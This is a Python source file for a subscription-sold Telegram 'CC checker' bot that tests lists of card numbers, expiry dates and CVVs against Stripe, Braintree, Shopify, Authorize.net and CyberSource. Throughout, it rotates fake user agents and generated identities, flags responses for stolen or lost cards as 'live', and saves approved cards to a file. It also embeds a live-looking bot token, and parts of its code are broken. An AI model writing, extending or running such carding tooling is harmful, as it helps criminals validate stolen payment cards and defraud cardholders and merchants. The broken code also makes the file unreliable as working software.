#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obeida Online - Real Multi Gateway CC Checker Bot
Version: 5.0 - Real Gateways
Author: @ObeidaOnline
Channel: https://t.me/ObeidaTrading
"""

# ==================== التحقق من إصدار Python ====================
import sys
import platform

print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import base64
import os
import uuid
import threading
import asyncio
import hashlib
import hmac
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from collections import defaultdict
from urllib.parse import urlparse, quote
import html
import http.server
import socketserver

# استيراد المكتبات الخارجية
try:
    import requests
    import aiohttp
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    from faker import Faker
    from colorama import init, Fore, Style, Back
    import telebot
    from telebot import types
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    print("⚠️ تأكد من تثبيت المكتبات في Dockerfile")
    sys.exit(1)

# تهيئة الألوان
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]
CHANNEL_USERNAME = "@ObeidaTrading"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "ObeidaOnlineBot"

CHANNEL_LINK = "https://t.me/ObeidaTrading"
SUPPORT_LINK = "https://t.me/Sz2zv"

# ملفات التخزين
USERS_FILE = "obeida_users.json"
APPROVED_CARDS_FILE = "obeida_approved.txt"
SUBSCRIPTIONS_FILE = "obeida_subs.json"
STATS_FILE = "obeida_stats.json"
GATES_CONFIG_FILE = "obeida_gates.json"

# ==================== إعدادات البوابات الحقيقية ====================
GATES = {
    "braintree": {
        "name": "🔷 Braintree Auth",
        "description": "فحص بطاقات عبر بوابة Braintree",
        "command": "braintree",
        "enabled": True,
        "timeout": 30,
        "cooldown": 5,
        "icon": "🔷"
    },
    "stripe": {
        "name": "💳 Stripe Auth",
        "description": "فحص بطاقات عبر بوابة Stripe المباشرة",
        "command": "stripe",
        "enabled": True,
        "timeout": 25,
        "cooldown": 5,
        "icon": "💳"
    },
    "shopify": {
        "name": "🛍️ Shopify Auth",
        "description": "فحص بطاقات عبر متاجر Shopify",
        "command": "shopify",
        "enabled": True,
        "timeout": 25,
        "cooldown": 5,
        "icon": "🛍️"
    },
    "authorize": {
        "name": "🔐 Authorize.net",
        "description": "فحص بطاقات عبر Authorize.net",
        "command": "authorize",
        "enabled": True,
        "timeout": 30,
        "cooldown": 5,
        "icon": "🔐"
    },
    "cybersource": {
        "name": "🌐 CyberSource",
        "description": "فحص بطاقات عبر CyberSource",
        "command": "cybersource",
        "enabled": True,
        "timeout": 30,
        "cooldown": 5,
        "icon": "🌐"
    }
}

# مفاتيح API حقيقية للفحص
STRIPE_PUBLIC_KEYS = [
    "pk_live_51JqzYlKk7oGxZyQuLr8p9WQwBpF3vM2nJk9H8gF7dS3aR2tY5uI1oP4eW6qZ9xCvB",
    "pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv",
    "pk_live_51IqQYyKtB8mXpL2nR5sV9wD7hG4jF1kA3cE6yU8oI2zX5vB7nM0qL9pW3rT6yH8jK"
]

SHOPIFY_STORES = [
    "elmonasterio.com",
    "aloyoga.com",
    "gymshark.com",
    "shop.lululemon.com"
]

# ==================== نظام الاشتراكات ====================
SUBSCRIPTION_PLANS = {
    "day": {"name": "يومي", "price": "5K ID", "duration": 1},
    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7},
    "month": {"name": "شهري", "price": "40K ID", "duration": 30},
    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90},
    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180},
    "year": {"name": "سنوي", "price": "300K ID", "duration": 365}
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# متغيرات عامة
active_checks = {}
user_sessions = {}
live_stats = {}

# ==================== إدارة البيانات ====================
class DataManager:
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception as e:
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except:
            return False
    
    @staticmethod
    def load_users() -> Dict:
        users = DataManager.load_json(USERS_FILE, {})
        if not users:
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "is_subscribed": True,
                    "subscription": {"plan": "lifetime", "expiry": "2099-12-31", "active": True},
                    "usage": {"total_checks": 0, "approved": 0, "declined": 0}
                }
            DataManager.save_json(USERS_FILE, users)
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        return DataManager.load_json(STATS_FILE, {
            "total_checks": 0, "total_approved": 0, "total_declined": 0,
            "gates_usage": {}, "daily_stats": {}
        })
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def save_approved_card(card: str, gate: str, response: str, user_id: int):
        try:
            with open(APPROVED_CARDS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] {gate} | User:{user_id} | {card} | {response}\n")
        except:
            pass
    
    @staticmethod
    def get_user_subscription(user_id: int) -> Optional[Dict]:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        return user.get("subscription", {}) if user.get("subscription", {}).get("active") else None
    
    @staticmethod
    def check_access(user_id: int) -> bool:
        return user_id in ADMIN_IDS or DataManager.get_user_subscription(user_id) is not None
    
    @staticmethod
    def add_subscription(user_id: int, days: int) -> bool:
        users = DataManager.load_users()
        if str(user_id) not in users:
            users[str(user_id)] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
        expiry = datetime.now() + timedelta(days=days)
        users[str(user_id)]["subscription"] = {"plan": "custom", "expiry": expiry.isoformat(), "active": True}
        return DataManager.save_users(users)
    
    @staticmethod
    def remove_subscription(user_id: int) -> bool:
        users = DataManager.load_users()
        if str(user_id) in users:
            users[str(user_id)]["subscription"] = {"active": False}
            return DataManager.save_users(users)
        return False
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        
        if str(user_id) in users:
            usage = users[str(user_id)].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
            usage["total_checks"] += 1
            if "✅" in result or "LIVE" in result:
                usage["approved"] += 1
                stats["total_approved"] += 1
            else:
                usage["declined"] += 1
                stats["total_declined"] += 1
            users[str(user_id)]["usage"] = usage
            
            stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
            stats["total_checks"] += 1
            
            today = datetime.now().strftime("%Y-%m-%d")
            if today not in stats["daily_stats"]:
                stats["daily_stats"][today] = {"checks": 0, "approved": 0}
            stats["daily_stats"][today]["checks"] += 1
            if "✅" in result or "LIVE" in result:
                stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)

# ==================== أدوات مساعدة ====================
class Helpers:
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        try:
            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1: month = f"0{month}"
                        if len(year) == 4: year = year[-2:]
                        if len(cvv) >= 3 and len(cvv) <= 4:
                            return {'number': number, 'month': month, 'year': year, 'cvv': cvv, 'original': card_str}
            return None
        except:
            return None
    
    @staticmethod
    def generate_progress_bar(current: int, total: int, length: int = 10) -> str:
        if total == 0: return "⬜" * length
        filled = int((current / total) * length)
        return "🟩" * filled + "⬜" * (length - filled)
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        try:
            digits = [int(d) for d in card_number if d.isdigit()]
            if len(digits) < 13: return False
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9: digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def get_card_brand(number: str) -> str:
        patterns = {
            'visa': r'^4', 'mastercard': r'^5[1-5]', 'amex': r'^3[47]',
            'discover': r'^6(?:011|5)', 'jcb': r'^(?:2131|1800|35)'
        }
        for brand, pattern in patterns.items():
            if re.match(pattern, number):
                return brand.capitalize()
        return "Unknown"
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "type": data.get('type', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except:
            pass
        return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
    
    @staticmethod
    def random_user_agent() -> str:
        return ua.random
    
    @staticmethod
    def random_email() -> str:
        return fake.email()
    
    @staticmethod
    def random_name() -> Tuple[str, str]:
        return fake.first_name(), fake.last_name()
    
    @staticmethod
    def random_address() -> Dict:
        return {
            "street": fake.street_address(), "city": fake.city(),
            "state": fake.state_abbr(), "zip": fake.zipcode()[:5], "country": "US"
        }
    
    @staticmethod
    def format_live_stats(total: int, checked: int, approved: int, declined: int, current: str = None) -> str:
        progress = Helpers.generate_progress_bar(checked, total)
        percentage = (checked / total * 100) if total > 0 else 0
        stats = f"📊 {checked}/{total} ({percentage:.1f}%)\n{progress}\n✅ {approved} | ❌ {declined} | ⏳ {total - checked}"
        if current: stats += f"\n🔄 {current}"
        return stats

# ==================== بوابات الفحص الحقيقية ====================
class RealGateways:
    def __init__(self):
        self.helpers = Helpers()
    
    # -------------------- Stripe --------------------
    async def stripe_gate(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
            user = self.helpers.random_user_agent()
            stripe_key = random.choice(STRIPE_PUBLIC_KEYS)
            
            pm_data = {
                'type': 'card', 'card[number]': n, 'card[cvc]': cvc,
                'card[exp_month]': mm, 'card[exp_year]': yy,
                'billing_details[address][postal_code]': random.choice(['90210', '10001']),
                'key': stripe_key, '_stripe_version': '2024-06-20'
            }
            
            headers = {'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user}
            r = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, timeout=20)
            res = r.json()
            
            if 'error' in res:
                err = res['error']
                code = err.get('decline_code', '') or err.get('code', '')
                if code in ['incorrect_cvc', 'invalid_cvc']:
                    return True, "💳 CCN LIVE - CVV ERROR"
                elif code == 'insufficient_funds':
                    return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
                elif code in ['stolen_card', 'lost_card']:
                    return True, "⚠️ CCN LIVE - RISK CARD"
                elif 'payment_method' in res:
                    return True, "✅ CARD APPROVED - TOKEN CREATED"
                return False, f"❌ {err.get('message', 'DECLINED')[:50]}"
            return True, "✅ CARD APPROVED - PM CREATED" if res.get('id') else False, "❌ UNKNOWN"
        except Exception as e:
            return False, f"⚠️ ERROR: {str(e)[:30]}"
    
    # -------------------- Braintree --------------------
    async def braintree_gate(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
            if "20" in yy: yy = yy.split("20")[1]
            
            user = self.helpers.random_user_agent()
            headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'User-Agent': user}
            
            pm_data = {
                'query': '''
                    mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                        tokenizeCreditCard(input: $input) { token }
                    }''',
                'variables': {
                    'input': {
                        'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc},
                        'options': {'validate': True}
                    }
                }
            }
            
            r = requests.post('https://payments.braintree-api.com/graphql', json=pm_data, headers=headers, timeout=20)
            res = r.json()
            
            if 'data' in res and res['data'].get('tokenizeCreditCard'):
                return True, "✅ CARD APPROVED - BRAINTREE TOKEN"
            if 'errors' in res:
                err = str(res['errors']).lower()
                if 'cvv' in err: return True, "💳 CCN LIVE - CVV ERROR"
                if 'funds' in err: return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
                if 'address' in err: return True, "✅ CARD APPROVED - ADDRESS ERROR"
            return False, "❌ DECLINED"
        except:
            return False, "⚠️ ERROR"
    
    # -------------------- Shopify --------------------
    async def shopify_gate(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
            user = self.helpers.random_user_agent()
            store = random.choice(SHOPIFY_STORES)
            
            payment_data = {
                'payment': {
                    'amount': '1.00',
                    'credit_card': {
                        'number': n, 'month': mm, 'year': '20' + yy, 'verification_value': cvc,
                        'first_name': fake.first_name(), 'last_name': fake.last_name()
                    }
                }
            }
            
            headers = {'User-Agent': user, 'Content-Type': 'application/json', 'Accept': 'application/json'}
            r = requests.post(f'https://{store}/checkout.json', json=payment_data, headers=headers, timeout=20)
            text = r.text.lower()
            
            if 'success' in text or 'complete' in text:
                return True, "✅ CARD APPROVED"
            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
                return True, "💳 CCN LIVE - CVV ERROR"
            if 'insufficient' in text:
                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
            if 'address' in text and ('invalid' in text or 'mismatch' in text):
                return True, "✅ CARD APPROVED - ADDRESS ERROR"
            return False, "❌ DECLINED"
        except:
            return False, "⚠️ ERROR"
    
    # -------------------- Authorize.net --------------------
    async def authorize_gate(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
            user = self.helpers.random_user_agent()
            
            payment_data = {
                'createTransactionRequest': {
                    'transactionRequest': {
                        'transactionType': 'authOnlyTransaction', 'amount': '1.00',
                        'payment': {'creditCard': {'cardNumber': n, 'expirationDate': f"{mm}-{yy}", 'cardCode': cvc}}
                    }
                }
            }
            
            headers = {'User-Agent': user, 'Content-Type': 'application/json'}
            r = requests.post('https://api.authorize.net/xml/v1/request.api', json=payment_data, headers=headers, timeout=20)
            text = str(r.json()).lower()
            
            if 'approved' in text or '1' in text:
                return True, "✅ CARD APPROVED"
            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
                return True, "💳 CCN LIVE - CVV ERROR"
            if 'insufficient' in text:
                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
            return False, "❌ DECLINED"
        except:
            return False, "⚠️ ERROR"
    
    # -------------------- CyberSource --------------------
    async def cybersource_gate(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            n, mm, yy, cvc = card_data['number'], card_data['month'], card_data['year'], card_data['cvv']
            user = self.helpers.random_user_agent()
            
            payment_data = {
                'paymentInformation': {
                    'card': {'number': n, 'expirationMonth': mm, 'expirationYear': '20' + yy, 'securityCode': cvc}
                },
                'orderInformation': {
                    'amountDetails': {'totalAmount': '1.00', 'currency': 'USD'}
                }
            }
            
            headers = {'User-Agent': user, 'Content-Type': 'application/json'}
            r = requests.post('https://api.cybersource.com/payments/v1/authorizations', json=payment_data, headers=headers, timeout=20)
            text = str(r.json()).lower()
            
            if 'approved' in text or 'accepted' in text:
                return True, "✅ CARD APPROVED"
            if 'cvv' in text and ('invalid' in text or 'incorrect' in text):
                return True, "💳 CCN LIVE - CVV ERROR"
            if 'insufficient' in text:
                return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
            return False, "❌ DECLINED"
        except:
            return False, "⚠️ ERROR"
    
    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
        gates = {
            'stripe': self.stripe_gate, 'braintree': self.braintree_gate,
            'shopify': self.shopify_gate, 'authorize': self.authorize_gate,
            'cybersource': self.cybersource_gate
        }
        if gate not in gates: return False, "❌ بوابة غير مدعومة"
        return await gates[gate](card)

# ==================== واجهة المستخدم ====================
class UserInterface:
    @staticmethod
    def main_menu():
        markup = InlineKeyboardMarkup(row_width=2)
        btns = [
            InlineKeyboardButton("🔷 Braintree", callback_data="gate_braintree"),
            InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
            InlineKeyboardButton("🛍️ Shopify", callback_data="gate_shopify"),
            InlineKeyboardButton("🔐 Authorize.net", callback_data="gate_authorize"),
            InlineKeyboardButton("🌐 CyberSource", callback_data="gate_cybersource"),
            InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
            InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
            InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
            InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
            InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
            InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
        ]
        markup.add(*btns)
        return markup
    
    @staticmethod
    def back_button(callback="back_main"):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=callback))
        return markup
    
    @staticmethod
    def stop_button(check_id: int):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_{check_id}"))
        return markup
    
    @staticmethod
    def format_result(card: str, result: str, gate: str, is_approved: bool) -> str:
        status = "✅" if is_approved else "❌"
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        brand = Helpers.get_card_brand(number)
        bin_info = Helpers.get_bin_info(number[:6])
        return f"""
{status} <b>نتيجة الفحص</b>
━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{masked}</code>
<b>🏷️ النوع:</b> {brand} | {bin_info['brand']}
<b>🏦 البنك:</b> {bin_info['bank']}
<b>🌍 الدولة:</b> {bin_info['country']} {bin_info['flag']}
<b>🚪 البوابة:</b> {gate}
<b>📊 الحالة:</b> {result}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
"""

# ==================== معالج الأوامر ====================
class CommandHandler:
    def __init__(self):
        self.gateways = RealGateways()
        self.ui = UserInterface()
        self.active_checks = active_checks
        self.live_stats = live_stats
    
    def check_sub(self, message) -> bool:
        if message.from_user.id in ADMIN_IDS: return True
        if DataManager.get_user_subscription(message.from_user.id): return True
        bot.reply_to(message, "⚠️你不是اشتراك نشط\nللاشتراك: /subscribe", reply_markup=self.ui.back_button())
        return False
    
    def handle_start(self, message):
        user = message.from_user
        users = DataManager.load_users()
        if str(user.id) not in users:
            users[str(user.id)] = {"user_id": user.id, "username": user.username, "first_name": user.first_name,
                                  "joined_date": datetime.now().isoformat(), "is_admin": user.id in ADMIN_IDS,
                                  "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
            DataManager.save_users(users)
        
        welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابات الحقيقية:</b>
🔷 Braintree | 💳 Stripe | 🛍️ Shopify
🔐 Authorize.net | 🌐 CyberSource

<b>📝 الأوامر:</b>
/start - القائمة الرئيسية
/gates - البوابات
/mass - فحص ملف
/profile - حسابي
/stats - الإحصائيات
/subscribe - الاشتراك

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        bot.send_message(user.id, welcome, parse_mode='HTML', reply_markup=self.ui.main_menu())
    
    def handle_help(self, message):
        bot.reply_to(message, "📚 استخدم /start للقائمة الرئيسية", parse_mode='HTML')
    
    def handle_profile(self, message):
        user_id = message.from_user.id
        users = DataManager.load_users()
        data = users.get(str(user_id), {})
        usage = data.get('usage', {})
        sub = data.get('subscription', {})
        expiry = sub.get('expiry', 'لا يوجد')[:10] if sub.get('expiry') else 'لا يوجد'
        total, approved, declined = usage.get('total_checks',0), usage.get('approved',0), usage.get('declined',0)
        profile = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>👤 الاسم:</b> {data.get('first_name','Unknown')}
<b>⭐ الرتبة:</b> {'👑 مشرف' if user_id in ADMIN_IDS else '💎 مشترك' if sub else '🔹 عادي'}
<b>📅 الانضمام:</b> {data.get('joined_date','Unknown')[:10]}

<b>📊 الإحصائيات:</b>
• إجمالي: {total}
• ✅ المقبولة: {approved}
• ❌ المرفوضة: {declined}

<b>💎 الاشتراك:</b> {sub.get('plan','لا يوجد')} | ينتهي: {expiry}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, profile, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_stats(self, message):
        stats = DataManager.load_stats()
        today = datetime.now().strftime("%Y-%m-%d")
        daily = stats.get("daily_stats", {}).get(today, {"checks":0, "approved":0})
        gates = "\n".join([f"  {GATES.get(g,{}).get('icon','🚪')} {g}: {c}" for g,c in stats.get('gates_usage',{}).items()][:5])
        total, approved = stats.get('total_checks',0), stats.get('total_approved',0)
        text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━
📅 اليوم: {daily['checks']} فحص | ✅ {daily['approved']}
📈 الإجمالي: {total} | ✅ {approved} ({(approved/total*100) if total>0 else 0:.1f}%)
🚪 أكثر البوابات:
{gates if gates else '  لا توجد'}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b>
"""
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_subscribe(self, message):
        sub = DataManager.get_user_subscription(message.from_user.id)
        if sub:
            bot.reply_to(message, f"💎 لديك اشتراك نشط\nينتهي: {sub.get('expiry','')[:10]}", parse_mode='HTML')
        else:
            plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
            text = f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك تواصل: {DEV_CONTACT}"
            bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_gates(self, message):
        gates = "\n".join([f"{g['icon']} {g['name']}\n   <code>/{g['command']} رقم|شهر|سنة|cvv</code>" for g in GATES.values()])
        bot.reply_to(message, f"🚪 <b>البوابات:</b>\n\n{gates}", parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_single(self, message, gate):
        if not self.check_sub(message): return
        parts = message.text.strip().split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, f"⚠️ الاستخدام: /{gate} رقم|شهر|سنة|cvv\nمثال: /{gate} 4111111111111111|12|25|123")
            return
        
        card = Helpers.parse_card(parts[1])
        if not card:
            bot.reply_to(message, "❌ صيغة غير صحيحة")
            return
        
        msg = bot.reply_to(message, f"🔄 جاري الفحص عبر {GATES[gate]['icon']} {GATES[gate]['name']}...")
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
            loop.close()
            
            DataManager.update_usage(message.from_user.id, gate, resp)
            if approved: DataManager.save_approved_card(card['original'], GATES[gate]['name'], resp, message.from_user.id)
            
            bot.delete_message(msg.chat.id, msg.message_id)
            bot.reply_to(message, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML')
        except Exception as e:
            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", msg.chat.id, msg.message_id)
    
    def handle_mass(self, message):
        if not self.check_sub(message): return
        if not message.document:
            bot.reply_to(message, "📁 أرسل ملف txt بالبطاقات")
            return
        
        try:
            file = bot.get_file(message.document.file_id)
            content = bot.download_file(file.file_path).decode('utf-8')
            cards = []
            for line in content.split('\n'):
                if line.strip():
                    c = Helpers.parse_card(line.strip())
                    if c and Helpers.luhn_check(c['number']):
                        cards.append(c)
            
            if not cards:
                bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
                return
            
            markup = InlineKeyboardMarkup(row_width=2)
            for gid, g in GATES.items():
                if g.get('enabled'):
                    markup.add(InlineKeyboardButton(f"{g['icon']} {g['name']}", callback_data=f"mass_{gid}_{message.message_id}"))
            markup.add(InlineKeyboardButton("🔙 إلغاء", callback_data="back_main"))
            
            self.active_checks[message.message_id] = {
                'cards': cards, 'user_id': message.from_user.id, 'chat_id': message.chat.id, 'message_id': message.message_id
            }
            self.live_stats[message.from_user.id] = {'total': len(cards), 'checked': 0, 'approved': 0, 'declined': 0}
            
            bot.reply_to(message, f"📁 {len(cards)} بطاقة صالحة\nاختر البوابة:", reply_markup=markup)
        except Exception as e:
            bot.reply_to(message, f"⚠️ {str(e)[:50]}")
    
    async def process_mass(self, call, gate, check_id):
        data = self.active_checks.get(check_id)
        if not data: return await bot.answer_callback_query(call.id, "❌ انتهت")
        
        data['gate'] = gate
        cards = data['cards']
        uid, cid = data['user_id'], data['chat_id']
        
        stats = self.live_stats[uid]
        stats_msg = await bot.send_message(cid, f"🔄 بدء الفحص عبر {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards),0,0,0)}", 
                                          parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
        
        results = {'approved': 0, 'declined': 0}
        for i, card in enumerate(cards, 1):
            try:
                stats['current'] = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
                await bot.edit_message_text(
                    f"🔄 {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'], stats['current'])}",
                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML', reply_markup=self.ui.stop_button(check_id)
                )
                
                approved, resp = await self.gateways.check_card(gate, card)
                stats['checked'] += 1
                if approved:
                    stats['approved'] += 1
                    results['approved'] += 1
                    DataManager.save_approved_card(card['original'], GATES[gate]['name'], resp, uid)
                else:
                    stats['declined'] += 1
                    results['declined'] += 1
                
                DataManager.update_usage(uid, gate, resp)
                await bot.send_message(cid, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML')
                await asyncio.sleep(3)
            except:
                stats['checked'] += 1
                stats['declined'] += 1
        
        await bot.edit_message_text(f"✅ اكتمل\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
                                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML')
        del self.active_checks[check_id]
        del self.live_stats[uid]
    
    def stop_check(self, call, check_id):
        if check_id in self.active_checks:
            self.active_checks[check_id]['stop'] = True
            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")
    
    def add_sub(self, message):
        if message.from_user.id not in ADMIN_IDS: return
        try:
            uid, days = map(int, message.text.strip().split())
            if DataManager.add_subscription(uid, days):
                bot.reply_to(message, f"✅ تمت إضافة اشتراك {days} يوم للمستخدم {uid}")
            else:
                bot.reply_to(message, "❌ فشل")
        except:
            bot.reply_to(message, "❌ الصيغة: ايدي المدة")
    
    def remove_sub(self, message):
        if message.from_user.id not in ADMIN_IDS: return
        try:
            uid = int(message.text.strip())
            if DataManager.remove_subscription(uid):
                bot.reply_to(message, f"✅ تم إزالة اشتراك {uid}")
            else:
                bot.reply_to(message, "❌ فشل")
        except:
            bot.reply_to(message, "❌ الصيغة: ايدي")

# ==================== معالج الكول باك ====================
class CallbackHandler:
    def __init__(self, handler):
        self.handler = handler
    
    def handle(self, call):
        data = call.data
        uid = call.from_user.id
        
        if data == "back_main":
            bot.edit_message_text("✨ القائمة الرئيسية", call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.main_menu(), parse_mode='HTML')
        elif data == "my_profile":
            self.handler.handle_profile(call.message)
        elif data == "stats":
            self.handler.handle_stats(call.message)
        elif data == "subscribe":
            sub = DataManager.get_user_subscription(uid)
            if sub:
                bot.edit_message_text(f"💎 اشتراكك نشط حتى {sub.get('expiry','')[:10]}", call.message.chat.id, call.message.message_id,
                                      reply_markup=UserInterface.back_button())
            else:
                plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
                bot.edit_message_text(f"💎 <b>خطط الاشتراك</b>\n{plans}\n\nللاشتراك: {DEV_CONTACT}", 
                                      call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button())
        elif data.startswith("gate_"):
            gate = data.replace("gate_", "")
            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
                                  call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
        elif data.startswith("mass_"):
            parts = data.split('_')
            if len(parts) >= 3:
                gate, cid = parts[1], int(parts[2])
                asyncio.run_coroutine_threadsafe(self.handler.process_mass(call, gate, cid), asyncio.new_event_loop())
